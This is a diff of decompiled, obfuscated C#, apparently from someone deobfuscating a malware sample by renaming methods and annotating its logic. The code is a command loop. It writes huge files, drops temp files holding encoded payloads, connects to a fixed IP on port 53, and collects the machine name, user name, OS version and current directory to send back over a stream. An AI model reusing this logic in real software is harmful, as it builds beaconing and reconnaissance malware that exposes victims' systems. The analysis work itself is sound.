@@ -76,40 +76,40 @@ namespace ns0
             {
               if (this.deobShouldClose)
                 return;
-              string str1 = this.deobCommands[numArray1[deobLoopCount]];
-              if (str1.ToLower() == "뛺뿭\xF6FF맲꣫\xF2D2룎\xE484")
+              string deobGivenCommand = this.deobCommands[numArray1[deobLoopCount]];
+              if (deobGivenCommand.ToLower() == "FAILOVER") //뛺뿭\xF6FF맲꣫\xF2D2룎\xE484
               {
-                int length = deobConnect.smethod_1(5000, 4000000);
+                int length = deobConnect.deobReturnRandom(5000, 4000000);
                 double[] numArray2 = new double[length];
                 for (int index2 = 0; index2 < length; ++index2)
                   numArray2[index2] = (double) index2;
                 this.deobWriteHugeFile();
-                str1 = str1 + "昈" + (object) Convert.ToInt32(length);
+                deobGivenCommand = deobGivenCommand + "昈" + (object) Convert.ToInt32(length);
               }
-              if (str1.ToLower() == "뇓ꇄ\xA4C9韛")
+              if (deobGivenCommand.ToLower() == "뇓ꇄ\xA4C9韛")
               {
                 string[] strArray = new string[2]
                 {
                   "눞3齫ꀉ\x0BDDퟁ㠗ᆾ\xF118�┟욚ᙷ\xF7B7亗༕冏뵈\xEBF6㟯\xE5A8ᰕ㑙❜楜‒㹁⡚\x215Bㅟ㵈⩕㜮礬昨桦甽眾眾獳愵洦电㡺縨挸瀵电嘙⠍渁煛思攆氏琂愅渗⨚昃缊㘖繜䠋跬鳡鷡髲解�鷢蓢ꚰ곧ꗠꛤ능\xAAFFꃨ냿캌髒藆臏蓃ꇓ菃闋麍跇탘賕裔軏ꃙ\xF7D0閵횰醨쏦薽즦즯�튤\xF3B9뺺\xEBB8領狀\xE1A9\xEFAA솒웟\xE081朗\xEA89ꗆ\xEB9C펌��춍좙풝탇�醒㭣㑮⍱罣⭦䕿\x187E䱢̰Ⅷ㍸㍵\x2E7D❮\x0877䝰ㅎ⍎㔄Փଡ଼ŘܑὋࡄṓ䄘潆浚癓恗敇ሯ̧\x1379瘳䈤ةࠠ\x0D3B帵ᘼအᠤ䘴嵺Ἡ䈲攃堇堐弍縆䔄樀繎爅焆搆籋䈝笎琝⭒",
                   "\xE5BE놢\xE7F0\xE6A7\xE5B8풵\xE5BD\xE2AE買薰힎솎뛄\xEC93�쒘\xE4D1�삄햓뻘\xE586톚튓ﮗ\xEC87⡯⩧㈹㩳此㡩Ⱡ᩻湵㍼ち❤睴⸺\x2E69ᅲࡃᭇݐݍ商㱄湀㨎ṅ㱆نซ\x2E5D㥎͝園細ᨠጭ甭搱吥愩塳帥ᠾᄷᄺ爭Ŀల簫搒㘎⁄氓䰄甉唉礚眛├ㄚ⤚䍘瀏䴈県貽웧\x9FF0돧\xF3A4駺곮�韻诫냻쯳꺥\x9FEF\xFFF0鏽럌\xE1D7�臈망볘쯀颎髅꿞뫗\xFDD3듌맑짒鋐즬훢얱者\xE5BA짷\xEAA9\xE5BA\xE4B1\x9FFE\xEAA4袴\xE3B1覱\xE8A5펱ꂅꋟ춑蚊���莋햞욇햆誚죘�햐\xF39D⩥♶㩯全⽦㙦"
                 };
-                int index2 = deobConnect.smethod_1(0, strArray.Length);
+                int index2 = deobConnect.deobReturnRandom(0, strArray.Length);
                 deobConnect.deobMakeFileTemp(strArray[index2]);
-                str1 += strArray[index2];
+                deobGivenCommand += strArray[index2];
               }
-              if (str1.ToLower() == "뇓ꇄ\xA4C9韛")
+              if (deobGivenCommand.ToLower() == "뇓ꇄ\xA4C9韛")
               {
                 deobConnect class1 = new deobConnect("留黙郝趇ꛉ췒ﶣ횮풱뢣\xEAA6\xEABF", 53); //connect to a fixed ip on port 53
               }
-              if (str1.ToLower() == "ⵌ㱈搁罛д丣Ũ̶")
-              {
-                string str2 = Environment.MachineName + "\x0E69偭ط" + Environment.CurrentDirectory + "\x0E69偭ط" + (object) Environment.OSVersion + "\x0E69偭ط" + Environment.UserName;
-                str1 += str2;
+              if (deobGivenCommand.ToLower() == "GENERATE") //ⵌ㱈搁罛д丣Ũ̶
+                            {
+                string deobEnvars = Environment.MachineName + "\x0E69偭ط" + Environment.CurrentDirectory + "\x0E69偭ط" + (object) Environment.OSVersion + "\x0E69偭ط" + Environment.UserName;
+                deobGivenCommand += deobEnvars;
               }
-              if (str1.ToLower() == "蒶킿쎻범뚉")
+              if (deobGivenCommand.ToLower() == "蒶킿쎻범뚉")
               {
                 string string_2 = this.deobAddressForSomething();
-                str1 = str1 + "닟\xEDD3ￃ뗓" + string_2;
+                deobGivenCommand = deobGivenCommand + "닟\xEDD3ￃ뗓" + string_2;
                 if (string_2 == "쯼")
                 {
                   if (!this.method_3("诧훪鋳�\x9FE6첬读", 1, 1))
@@ -121,13 +121,13 @@ namespace ns0
                   {
                     string_2 = string_2.Substring(0, string_2.LastIndexOf("髰")) + "髰" + deobLoopCount2.ToString();
                     if (this.method_3(string_2, 1, 1))
-                      str1 = str1 + "짭짾퓭鶢胠쳰쏽鏽裡쟵" + string_2;
+                      deobGivenCommand = deobGivenCommand + "짭짾퓭鶢胠쳰쏽鏽裡쟵" + string_2;
                   }
                 }
               }
-              string str3 = str1;
+              string str3 = deobGivenCommand;
               this.deobSleep(1, 2);
-              this.streamWriter_0.WriteLine(str1);
+              this.streamWriter_0.WriteLine(deobGivenCommand);
               this.streamWriter_0.Flush();
               Console.Write("髰");
               string string_3 = this.streamReader_0.ReadLine();
@@ -173,7 +173,7 @@ namespace ns0
       return fileName;
     }
 
-    public static int smethod_1(int int_0, int int_1)
+    public static int deobReturnRandom(int int_0, int int_1)
     {
       lock (deobConnect.deobGlobalObject) //lock global object?
         return deobConnect.deobGlobalRandom.Next(int_0, int_1);
